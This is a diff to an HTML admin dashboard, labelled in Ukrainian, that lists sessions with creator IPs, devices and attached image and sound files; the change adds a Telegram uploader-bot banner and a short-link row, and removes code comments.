@@ -14,8 +14,42 @@
         
         h1 { 
             text-align: center; color: #00ff99; 
-            text-shadow: 0 0 10px #00ff99; margin-bottom: 30px; letter-spacing: 2px;
+            text-shadow: 0 0 10px #00ff99; margin-bottom: 20px; letter-spacing: 2px;
         }
+
+        /* --- BOT BANNER START --- */
+        .bot-banner {
+            background: #112233;
+            border: 1px solid #00aaff;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 0 10px rgba(0, 170, 255, 0.2);
+        }
+        .bot-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .bot-icon {
+            font-size: 30px;
+        }
+        .bot-text h3 {
+            margin: 0; color: #00aaff; font-size: 16px;
+        }
+        .bot-text p {
+            margin: 5px 0 0 0; color: #ccc; font-size: 12px;
+        }
+        .bot-btn {
+            background: #00aaff; color: black; text-decoration: none;
+            padding: 8px 15px; border-radius: 5px; font-weight: bold;
+            font-size: 12px; transition: 0.3s;
+        }
+        .bot-btn:hover { background: white; box-shadow: 0 0 10px white; }
+        /* --- BOT BANNER END --- */
 
         .sessions-grid { 
             display: grid; 
@@ -46,10 +80,9 @@
         .info-label { color: #555; font-weight: bold; }
         .highlight { color: #00ff99; }
 
-        /* Files Section */
         .files-section {
             margin-top: 15px; border-top: 1px dashed #444; padding-top: 10px;
-            flex-grow: 1; /* Займає вільне місце */
+            flex-grow: 1; 
         }
         .files-title { font-size: 11px; font-weight: bold; color: #00aaff; margin-bottom: 5px; text-transform: uppercase; }
         
@@ -74,7 +107,6 @@
         }
         .btn-download:hover { background: #00aaff; color: black; }
 
-        /* Action Buttons */
         .actions { display: flex; gap: 8px; margin-top: 15px; }
         .control-btn, .del-btn {
             flex: 1; padding: 10px; border: none; cursor: pointer; font-weight: bold;
@@ -85,17 +117,34 @@
         .del-btn { background: #220000; color: #ff3366; border: 1px solid #550000; }
         .del-btn:hover { background: #ff3366; color: white; border-color: #ff3366; }
 
-        /* Scrollbar */
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-track { background: #111; }
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
         
         .no-data { grid-column: 1/-1; text-align: center; padding: 50px; color: #444; border: 1px dashed #333; }
+        
+        /* Mobile responsive for banner */
+        @media (max-width: 600px) {
+            .bot-banner { flex-direction: column; text-align: center; gap: 10px; }
+            .bot-info { flex-direction: column; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🛰️ GLOBAL MONITORING</h1>
+
+        <div class="bot-banner">
+            <div class="bot-info">
+                <div class="bot-icon">🤖</div>
+                <div class="bot-text">
+                    <h3>FILE UPLOADER BOT ACTIVE</h3>
+                    <p>Завантажуй файли через Telegram та отримуй посилання</p>
+                </div>
+            </div>
+            <a href="https://t.me/live_ai_nfc_bot" target="_blank" class="bot-btn">ВІДКРИТИ БОТА ↗</a>
+        </div>
+
         <div id="grid" class="sessions-grid">Waiting for data...</div>
     </div>
 
@@ -115,9 +164,8 @@
                 container.innerHTML = '';
                 
                 sessions.forEach(s => {
-                    const isActiveNow = (Date.now() - s.lastActiveAt) < 60000; // Активна, якщо була дія за останню хвилину
+                    const isActiveNow = (Date.now() - s.lastActiveAt) < 60000;
                     
-                    // Об'єднуємо зображення і звуки в один список для відображення
                     const allFiles = [
                         ...s.imagesFiles.map(f => ({...f, icon: '📷'})),
                         ...s.soundsFiles.map(f => ({...f, icon: '🔊'}))
@@ -125,7 +173,6 @@
 
                     let filesHtml = '';
                     if (allFiles.length > 0) {
-                        // Сортуємо: нові файли зверху
                         allFiles.reverse(); 
                         
                         const listItems = allFiles.map(f => `
@@ -161,6 +208,7 @@
                             <span class="online-badge">ONLINE: ${s.onlineCount}</span>
                         </div>
                         
+                        <div class="info-row"><span class="info-label">Лінк:</span> <a href="${s.fullUrl}" target="_blank" style="color:#00aaff">${s.shortCode || '...'}</a></div>
                         <div class="info-row"><span class="info-label">Створено:</span> ${s.createdAt}</div>
                         <div class="info-row"><span class="info-label">Автор IP:</span> ${s.creator.ip}</div>
                         <div class="info-row"><span class="info-label">Девайс:</span> ${s.creator.device}</div>
@@ -187,9 +235,6 @@
         }
 
         function openControl(id) {
-            // Щоб увійти в адмінку конкретної сесії, нам потрібно зберегти ID в localStorage
-            // або просто відкрити адмінку і дати можливість ввести ID.
-            // Тут ми скопіюємо ID в буфер і відкриємо адмінку.
             prompt("Скопіюй ID сесії та встав його в URL (якщо потрібно) або в код:", id);
             window.open(`/admin.html`, '_blank');
         }
@@ -204,7 +249,7 @@
             try {
                 const res = await fetch(`/session/${id}`, { method: 'DELETE' });
                 if (res.ok) {
-                    loadAllSessions(); // Оновлюємо список
+                    loadAllSessions();
                 } else {
                     alert('Помилка при видаленні.');
                     btn.innerText = originalText;
@@ -217,7 +262,6 @@
             }
         }
 
-        // Автооновлення кожні 4 секунди
         loadAllSessions();
         setInterval(loadAllSessions, 4000);
     </script>
